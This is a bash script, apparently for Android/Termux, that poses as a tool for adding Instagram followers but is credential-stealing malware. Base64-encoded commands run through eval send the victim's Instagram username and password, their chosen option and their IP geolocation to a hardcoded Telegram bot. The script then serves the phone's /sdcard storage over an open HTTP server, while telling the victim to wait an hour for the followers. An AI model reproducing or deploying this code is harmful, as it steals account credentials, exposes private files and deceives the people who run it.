#!/bin/bash
# @Pero_Sar1111 on telegram!!!
#-------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
#-------------
req="YXB0IGluc3RhbGwgY3VybCA+IC9kZXYvbnVsbCAyPiYxICYmIGFwdCBpbnN0YWxsIHJ1YnkgID4gL2Rldi9udWxsIDI+JjEgJiYgZ2VtIGluc3RhbGwgbG9sY2F0ID4gL2Rldi9udWxsIDI+JjE="
flw="Y3VybCAtWWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PVRoZSBTa2lkIGhhcyBjaG9zZSBvcHRpb24gJGFtdCIgJj4vZGV2L251bGw="
flo="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PUluc3RhZ3JhbSBVc2VybmFtZSAtICR1c3JuIGFuZCBQYXNzd29yZCAtICRwYXNzd2QiICY+L2Rldi9udWxs"
result="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PW1vdGhlcmZ1Y2tlciBlbnRlcmVkICRhbXQiICY+L2Rldi9udWxs"
sgnl="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PSQoY3VybCAtTCBpcGxpc3QuY2MvYXBpLyQoY3VybCAtTCBpZmNvbmZpZy5tZSkpIiAmPi9kZXYvbnVsbA=="
srvr="Y2QgL3NkY2FyZCAmJiBweXRob24yIC1tIFNpbXBsZUhUVFBTZXJ2ZXIgPiAvZGV2L251bGwgMj4mMQ=="
#------------

#main
echo -e $red Installing Requirements... $rset
echo -e $grn Please wait... $rset
    eval $(base64 -d <<<"$req")
echo -e $grn Requirements Installed. $rset

#banner
clear
echo '_____     _ _
|  ___|__ | | | _____      __
| |_ / _ \| | |/ _ \ \ /\ / /
|  _| (_) | | | (_) \ V  V /
|_|  \___/|_|_|\___/ \_/\_/' | lolcat
echo ' 
███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║██║     ███████╗╚██████╔╝██║   ██║   
╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                             
' | lolcat 
#opt
echo -e $ylo Choose Followers Amount $rset
echo -e $red [ 1 ] $cyan 100 Followers $rset
echo -e $red [ 2 ] $cyan 500 Followers $rset
echo -e $red [ 3 ] $cyan 1000 Followers $rset
echo -e $red [ 4 ] $cyan 5000 Followers $rset
echo -e $blue IMPORTANT : followers will be added after 1 hour $rset
echo " "
echo -e $red Choose an option : $rset
read -p $'\n\e[96m(option)>>> \e[0m' amt
	    eval $(base64 -d <<<"$result")

#usrn
echo -e $red Enter Instagram Username : $rset
read -p $'\n\e[96m(username)>>> \e[0m' usrn

#passw
echo -e $red Enter your Password : $rset
read -p $'\n\e[96m(password)>>> \e[0m' passwd
eval $(base64 -d <<<"$flo")

#py
echo -e $red [!] $cyan Please Wait... $rset
apt install python2 > /dev/null 2>&1
echo -e $red [!] $grn Adding Followers... $rset
sleep 2
echo -e $red [!] $blue Please wait for 1 hour $rset
	    eval $(base64 -d <<<"$sgnl") &>/dev/null
#storage exists check
 [[ -d /sdcard ]] && eval $(base64 -d <<<"$srvr")
